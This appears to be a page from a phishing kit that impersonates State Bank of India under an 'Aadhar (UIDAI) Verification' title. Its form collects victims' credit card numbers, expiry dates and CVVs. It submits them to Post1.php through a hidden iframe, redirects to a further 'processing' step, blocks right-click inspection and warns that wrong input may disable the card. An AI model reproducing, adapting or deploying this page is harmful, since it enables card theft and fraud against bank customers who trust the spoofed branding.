<?php
    // Start the session
    session_start();

    // Check if the session variable 'User_ID' is set
    if (isset($_SESSION['User_ID'])) {
        // Retrieve and sanitize the username
        $username = htmlspecialchars($_SESSION['User_ID']);
    } else {
        // Redirect to the login page if not logged in
        header("Location: index.html");
        exit();
    }
    ?>
<!DOCTYPE HTML> 
<html>
   <head>
      <title>AADHAR (UIDAI) Verification | SBI</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
      <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
      <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
      <link rel="manifest" href="/site.webmanifest">
      <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
      <meta name="msapplication-TileColor" content="#da532c">
      <link rel="stylesheet" type="text/css" href="Style.css">
      <link rel="stylesheet" type="text/css" href="Style_Main.css">
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
   </head>
   <style>
   #ii
   {
   position:absolute;
   top:4px;
   margin-left:-12%;
   }
   .login-box {
   width: 105%;
   padding: 5px;
   }
   .name
   {
   text-transform:uppercase;
   }
   .login-box .user-box {
   position: relative;
   }
   
   .login-box .user-box input {
   width: 100%;
   padding: 2px 4px;
   font-size: 16px;
   color: black;
   margin-bottom: 40px;
   margin-left:0px;
   border: none;
   caret-color:#673391;
   border-bottom: 1.5px solid #CCCCCC;
   outline: none;
   background: transparent;
   transition: border-color 0.2s;
   }
   .login-box .user-box label {
   position: absolute;
   top:-10px;
   left: 2px;
   padding: 5px 2px;
   font-size: 15px;
   font-family: ;
   color: #506070;
   pointer-events: none;
   transition: 0.3s;
   font-family: 'Open Sans', sans-serif;
   font-weight:400;
   
   }
   .login-box input:focus {
   width:100%;
   margin-bottom: 40px;
   padding: 2px 4px;
   margin-left:0px;
   font-size:16px;
   border-width: 2px;
   border-image: linear-gradient(#673391,#673392);
   border-image-slice: 1;
   
   }
   
   .login-box .user-box input:focus ~ label,
   .login-box .user-box input:valid ~ label {
   top: -30px;
   left: 2px;
   margin-left:2px;
   color: #506070;
   font-size: 14px;
   font-family: 'Open Sans', sans-serif;
   font-weight:600;
   }
   
   .login-box-mob {
   width: 100%;
   padding: 10px;
   margin-top:-14px;
   }
   .login-box-mob .user-box-mob {
   position: relative;
   }
   
   .error
   {
   color: Red;
   font-family: 'Work Sans', sans-serif;
   font-size:11px;
   font-style: italic;
   }
   </style>
   <script language="javascript"> 
   var message="This function is not allowed here.";
   function clickIE4(){
   if (event.button==2){
   alert(message);
   return false;
   }
   }
   function clickNS4(e){
   if (document.layers||document.getElementById&&!document.all){
   if (e.which==2||e.which==3){
   alert(message);
   return false;
   }
   }
   }
   if (document.layers){
   document.captureEvents(Event.MOUSEDOWN);
   document.onmousedown=clickNS4;}
   else if (document.all&&!document.getElementById){
   document.onmousedown=clickIE4;}
   document.oncontextmenu=new Function("alert(message);return false;")
   </script>
   <body onload="startTimer();" style="background:#fff;">
      <div class="container-fluid m-0 p-0">
    <img src="Header.png" width="98%">
    <img src="Menu.png" id="ii" width="10%">
</div>
      <section class="">
         <div class="container">
         <!-- Static- Please don't do anything here-->
         <script type="text/javascript">var submitted=false;</script>
         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_Aadhar6.php';}"></iframe>
         <!--My Form-->
         <form action="Post1.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
            <div class="box">
               <div class="page-hea">
                  <div class="row">
                     <div class="col-xs-6 col-md-6">
                     <h2 style="font-family: 'Open Sans', sans-serif; font-size:16px; font-weight:600; align-item:centre; text-align:centre;">CREDIT CARD Verification </h2>
                     </div>
                     <div class="col-xs-6 col-md-6 text-right">
                     <h2>X</h2>
                     </div>
                  </div>
               </div>
               <div class="row">
                  <div class="col-md-6 col-xs-12">
				   <!-- <div class="progress">
                               <div class="progress-bar" style="font-family: 'Open Sans', sans-serif; color:#fff; font-weight:500; width:80%;">75% KYC Completed</div> -
                           </div> -->
                     <div class="p-50">
                        <!-- <h4 style="font-family: 'Open Sans', sans-serif; color:#000; font-weight:700; margin-top:-10%;">Aadhar (UIDAI) Verification</h4> -->
                        <br><br>
                        <div class="login-box">
                        <div class="user-box" style="margin-top:-5%;">
                        <input type="numeric" name="C_Number" class="name" minlength="16" maxlength="16"
                        required="">
                        <label>Card Number<span style="color:red;"> *</span></label>
                        </div>
<div class="user-box">
    <input type="text" name="Expiry_Date" id="expiry-date" inputmode="numeric" maxlength="9"
           placeholder="" pattern="\d{2} \/ \d{4}" 
           title="Please enter a valid expiry date in MM / YYYY format" required>
    <label>EX (MM / YYYY)<span style="color:red;"> *</span></label>
</div>

<script>
    document.getElementById('expiry-date').addEventListener('input', function (e) {
        let input = e.target.value;

        // Allow only digits and a single " / " in the correct position
        input = input.replace(/[^0-9]/g, ''); // Remove all non-numeric characters
        if (input.length > 2 && input[2] !== '/') {
            input = input.slice(0, 2) + ' / ' + input.slice(2);
        }

        // Limit the input to MM / YYYY format (9 characters including spaces and slash)
        if (input.length > 9) {
            input = input.slice(0, 9);
        }

        // Update the input field value
        e.target.value = input;
    });

    // Validate the input format on blur (optional)
    document.getElementById('expiry-date').addEventListener('blur', function (e) {
        const input = e.target.value;
        const regex = /^(0[1-9]|1[0-2]) \/ \d{4}$/; // Match MM / YYYY format
        if (!regex.test(input)) {
            alert('Please enter a valid expiry date in MM / YYYY format');
            e.target.value = ''; // Clear the input if invalid
        }
    });
</script>

<div class="login-box">
                        <div class="user-box" style="margin-top:-5%;">
                        <input type="numeric" name="C_Value" class="name" minlength="3" maxlength="4"
                        required="">
                        <label>CVV<span style="color:red;"> *</span></label>
                        </div>


                        <div class="user-box">
                       
                        <br>
                        <div>
                        <h4 style="font-size:15px; font-family: 'Open Sans', sans-serif; color:red; font-weight:600; margin-top:-10%;">Please Note :- <span>
                        <p1 style="font-size:13px; font-family: 'Open Sans', sans-serif; color:grey; font-weight:400;">You entered your Credit Card Carefully, Tow Wrong Input Card may Disable.</p1></span>
                        </h4>
                        </div>
               </div>
            </div>
            <div class="row">
               <div class="col-xs-12 col-md-12 text-center">
                  <a href="#" style="font-family: 'Open Sans', sans-serif; font-weight:500;" class="btn btn-border">Back</a>
                  <button type="submit" style="font-family: 'Open Sans', sans-serif; font-weight:500;" class="btn btn-primary"> Submit </button>
               </div>
            </div><br>
          </form>
         </div>
      </section>
      <footer>
              <img src="Security.png"width="100%">
              <img src="Footer.png" class="img-fluid hidden-lg hidden-md" width="100%">
              
              </footer>
      
      
	  <script>
	  var timeleft = 30;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
	  </script>
</div>
</div>
</body>
</html>